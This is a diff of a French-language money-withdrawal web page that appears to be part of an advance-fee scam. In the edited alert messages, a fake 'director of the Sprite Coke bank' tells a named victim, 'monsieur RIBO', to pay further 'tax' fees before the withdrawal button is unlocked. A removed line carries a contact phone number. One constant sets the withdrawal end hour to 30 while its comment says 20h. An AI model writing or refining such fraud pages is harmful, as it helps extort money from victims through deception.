@@ -2,7 +2,6 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Retrait d'argent</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
@@ -142,10 +141,6 @@
 <body>
     <div class="container">
         <h1>Je retire mes fonds</h1>
-        <div classe="texte">
-            <h5>Minimum de retrait a retiré ce monsieur RIBO est passé a 579 000 FCFA</h1>
-        </div>
-        
         
         <div class="balance-display">
             Solde actuel: <span id="current-balance">0 FCFA</span>
@@ -184,7 +179,7 @@
         </form>
     </div>
 
-    <script type="module">
+<script type="module">
 /**
  * Script de gestion des retraits d'argent
  * 
@@ -231,11 +226,11 @@ const auth = getAuth(app);
 const database = getDatabase(app);
 
 // ======== CONSTANTES ========
-const MIN_WITHDRAWAL = 579000;
+const MIN_WITHDRAWAL = 1000;
 const MAX_WITHDRAWAL = 850000;
 const FEE_PERCENTAGE = 0.10;
-const WITHDRAWAL_START_HOUR = 9; // Heure de début des retraits (9h)
-const WITHDRAWAL_END_HOUR = 20;  // Heure de fin des retraits (20h)
+const WITHDRAWAL_START_HOUR = 8; // Heure de début des retraits (8h)
+const WITHDRAWAL_END_HOUR = 30;  // Heure de fin des retraits (20h)
 
 // ======== VARIABLES GLOBALES ========
 let currentBalance = 0;
@@ -406,7 +401,7 @@ async function loadUserData(userId) {
         // Vérification si l'utilisateur est bloqué
         const isBlocked = await checkIfUserBlocked(userId);
         if (isBlocked) {
-            showBlockedAlert("Félicitations 🎁🎉 monsieur RIBO vous avez toutes payé maintenant vous avez le droit de lancé votre retrait minimum a retiré 579 000f pour votre niveau, votre solde actuel ne vaut pas numéro qui vas recevoir la somm +2290158841076'.");
+            showBlockedAlert("Bonjour monsieur RIBO, je suis monsieur le directeur de la banque Sprite Coke. Votre solde est au niveau de 223 944 FCFA. Vous avez payé une somme de taxe de 15 000 FCFA. Vous devez retirer toute la somme qui est sur votre compte. Veuillez payer les 10 000 FCFA et lancer le retrait. Merci.");
             document.getElementById('withdrawal-button').disabled = true;
             return;
         }
@@ -512,7 +507,7 @@ async function processWithdrawal() {
     // Vérification si l'utilisateur est bloqué
     const isBlocked = await checkIfUserBlocked(currentUser.uid);
     if (isBlocked) {
-        showBlockedAlert("Bonjour monsieur RIBO, je suis monsieur le directeur de la banque Sprite Coke. Votre solde est au niveau de 223 944 FCFA. Vous avez payé une somme de taxe de 15 000 FCFA. Vous devez retirer toute la somme qui est sur votre compte. Montant reste à payer 5000 FCFA payer les 5 000 FCFA et lancer le retrait. Montant déjà payé 10 000 FCFA Merci.");
+        showBlockedAlert("Bonjour monsieur RIBO, je suis monsieur le directeur de la banque Sprite Coke. Votre solde est au niveau de 223 944 FCFA. Vous avez payé une somme de taxe de 15 000 FCFA. Vous devez retirer toute la somme qui est sur votre compte. Veuillez payer les 10 000 FCFA et lancer le retrait. Merci.");
         return;
     }
     
